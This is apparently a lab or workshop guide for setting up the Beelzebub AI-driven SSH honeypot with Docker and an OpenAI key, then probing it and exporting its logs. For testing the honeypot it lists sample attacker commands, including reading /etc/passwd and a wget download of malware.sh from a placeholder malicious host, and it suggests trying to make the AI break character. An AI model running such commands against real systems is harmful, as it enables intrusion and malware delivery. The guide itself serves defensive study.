Beelzebub is an advanced honeypot framework designed to provide a highly secure environment for detecting and analyzing cyber attacks. It offers a low code approach for easy implementation and uses AI to mimic the behavior of a high-interaction honeypot

You can find the original GitHub of at [Beelzebub Repo](https://github.com/mariocandela/beelzebub)

# Setup
Participants will deploy and monitor an AI-powered SSH honeypot (Beelzebub) to detect and analyze attacker behavior in real time

- $`sudo su -`
- $`apt update && apt upgrade -y`
- $`systemctl enable --now docker`
- $`cd /opt`
- $`git clone https://github.com/mariocandela/beelzebub.git`

### Get the ChatGPT Api Key
- Go to [ChatGPT](https://chatgpt.com/) and create an account if you don’t have one
- Make sure you have credits or a payment method at [Billing Setting](https://platform.openai.com/settings/organization/billing/overview)
- Go to [API Keys](https://platform.openai.com/api-keys) and create a new key
- Save this key as you will only see it once!

### Deployment
- Make sure you are into **/opt/beelzebub/**
- $`nano docker-compose.yml` - Put your key here
<img width="446" height="71" alt="image" src="https://github.com/user-attachments/assets/5f407ef9-759e-4eec-8d97-98ef396dc30d" />

- Also comment the **Default SSH Mapping**(ssh 22 port)
<img width="202" height="84" alt="image" src="https://github.com/user-attachments/assets/4375696b-89c3-45a6-afd9-d2f5a549168e" />

- $`cd configurations/services/`
- $`mv ./ssh-22.yaml ~`
- $`nano ./ssh-2222.yaml` - Add your key with double quotes around it like `OPENAI_API_KEY: "your_api_key_here"`
- $`cd /opt/beelzebub/`
- $`docker-compose build`
- $`docker-compose up -d`

# Try it
Connect to it like
- $`ssh -p 2222 root@127.0.0.1` - use password "**1234**"
- Try using any commands like **ls** or **id**
<img width="659" height="126" alt="image" src="https://github.com/user-attachments/assets/914c1f89-c3d0-412d-bae6-7b9fcee70d9e" />

Everything you see is AI generated, and that's what an attacker would see

Cool, right?

- Try running suspicious commands an attacker would use
<pre>uname -a
cat /etc/passwd
wget http://malicious.example/malware.sh
id</pre>

Now exit the session to export the logs

- $`cd /opt/beelzebub/`
- $`docker-compose logs -f`
- $`docker-compose logs > honeypot.log`

Take your time into analyzing the logs and seeing how they are being built

Try to make ChatGpt break character, this method, like anything else in cybersecurity isn't flawless, but it surely tricks hackers and does its job, **to increase Attack Time**



